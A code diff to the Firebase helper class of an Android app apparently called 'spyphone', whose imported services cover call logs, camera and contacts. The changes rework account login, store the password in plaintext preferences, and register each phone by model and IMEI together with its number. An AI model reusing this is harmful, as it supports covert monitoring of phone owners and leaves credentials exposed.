@@ -3,12 +3,14 @@ package emit.esy.es.spyphone.util;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Message;
 import android.os.Messenger;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+import android.widget.TextView;
 
 import com.firebase.client.AuthData;
 import com.firebase.client.ChildEventListener;
@@ -20,6 +22,8 @@ import java.util.HashMap;
 import java.util.Map;
 
 import emit.esy.es.spyphone.R;
+import emit.esy.es.spyphone.StartStopActivity;
+import emit.esy.es.spyphone.interfaces.UpdateUI;
 import emit.esy.es.spyphone.services.CallLogService;
 import emit.esy.es.spyphone.services.CameraService;
 import emit.esy.es.spyphone.services.ContactsService;
@@ -35,62 +39,93 @@ public class FirebaseUtil {
     private static final String LOG_TAG = "FirebaseUtil";
     static String musername, mpassword;
     volatile String id;
-    Firebase ref, userRef;
+    Firebase ref, userRef, deviceRef;
     static Context mcontext;
+    UpdateUI updateUI;
+    TextView label;
 
-    public FirebaseUtil(Context context, String username, String password){
+
+    public FirebaseUtil(Context context){
         mcontext = context;
-        musername = username;
-        mpassword = password;
     }
 
-    private void createUser() {
-        ref.createUser(musername, mpassword, new Firebase.ValueResultHandler<Map<String, Object>>() {
+    public FirebaseUtil(Context context, TextView label, UpdateUI updateUI){
+        mcontext = context;
+        this.updateUI = updateUI;
+        this.label = label;
+        Firebase.setAndroidContext(mcontext);
+    }
+
+
+    public void createUser(final String username, final String password) {
+        ref = new Firebase(mcontext.getString(R.string.domain));
+        ref.createUser(username, password, new Firebase.ValueResultHandler<Map<String, Object>>() {
 
             @Override
             public void onSuccess(Map<String, Object> result) {
                 Log.d(LOG_TAG, "User created. ID - " + result.get("uid").toString());
                 id= result.get("uid").toString();
-                //setOnline(id, false);
-                //authenticate user
-                authenticateUser();
+
+                SharedPreferences sp = mcontext.getSharedPreferences(mcontext.getString(R.string.sharedPrefs), Context.MODE_PRIVATE);
+                SharedPreferences.Editor editor = sp.edit();
+                editor.putString("username", username);
+                editor.putString("password", password);
+                editor.commit();
+
+                mcontext.startActivity(new Intent(mcontext, StartStopActivity.class).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
 
             }
 
             @Override
             public void onError(FirebaseError firebaseError) {
                 Log.d(LOG_TAG, "CreateUser ERROR");
+
+                updateUI.updateUI(label);
             }
         });
     }
 
-    public void authenticateUser() {
+    public void authenticateUser(final String username, final String password, final boolean auth) {
         ref = new Firebase(mcontext.getString(R.string.domain));
-        ref.authWithPassword(musername, mpassword, new Firebase.AuthResultHandler() {
+        ref.authWithPassword(username, password, new Firebase.AuthResultHandler() {
 
             @Override
             public void onAuthenticated(AuthData authData) {
-                id = authData.getUid();
-                Log.d(LOG_TAG, "User " + id + " authenticated");
-                SharedPreferences sp = mcontext.getSharedPreferences(mcontext.getString(R.string.sharedPrefs), Context.MODE_PRIVATE);
-                SharedPreferences.Editor editor = sp.edit();
-                editor.putString("username", musername);
-                editor.commit();
-                setUpChildRef();
+                Log.d(LOG_TAG, "User authenticated");
+                if(auth == true) {
+                    id = authData.getUid();
+                    Log.d(LOG_TAG, "User " + id + " authenticated");
+                    setUpChildRef();
+                } else {
+                    SharedPreferences sp = mcontext.getSharedPreferences(mcontext.getString(R.string.sharedPrefs), Context.MODE_PRIVATE);
+                    SharedPreferences.Editor editor = sp.edit();
+                    editor.putString("username", username);
+                    editor.putString("password", password);
+                    editor.commit();
+                    mcontext.startActivity(new Intent(mcontext, StartStopActivity.class).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+                }
             }
 
             @Override
             public void onAuthenticationError(FirebaseError firebaseError) {
+                Log.d(LOG_TAG, "AuthUser ERROR");
                 //If error == no such user, create user
                 switch (firebaseError.getCode()) {
                     case FirebaseError.USER_DOES_NOT_EXIST:
-                        createUser();
+                        createUser(username, password);
+                        break;
+                    default:
+                        try {
+                            updateUI.updateUI(label);
+                        } catch(Exception e){}
                         break;
                 }
             }
         });
 
     }
+
+
 
     Handler handler = new Handler() {
         @Override
@@ -288,7 +323,7 @@ public class FirebaseUtil {
     }
 
     private void setOnline(String id, boolean b) {
-        userRef = ref.child(id);
+        userRef = ref.child(id).child(getDeviceRef());
         Map<String, Object> user = new HashMap<>();
         user.put("phoneNumber", getPhoneNumber());
         user.put("isOnline", b);
@@ -307,6 +342,11 @@ public class FirebaseUtil {
         }
     }
 
+    private String getDeviceRef() {
+        TelephonyManager telephonyManager = (TelephonyManager) mcontext.getSystemService(Context.TELEPHONY_SERVICE);
+        return Build.MANUFACTURER + "-" + Build.MODEL + "-" + telephonyManager.getDeviceId();
+    }
+
     private String getPhoneNumber() {
         TelephonyManager tm = (TelephonyManager) mcontext.getSystemService(Context.TELEPHONY_SERVICE);
         String phNum = tm.getLine1Number();
@@ -319,4 +359,8 @@ public class FirebaseUtil {
     }
 
 
+    public void unauth() {
+        ref.unauth();
+        userRef.unauth();
+    }
 }
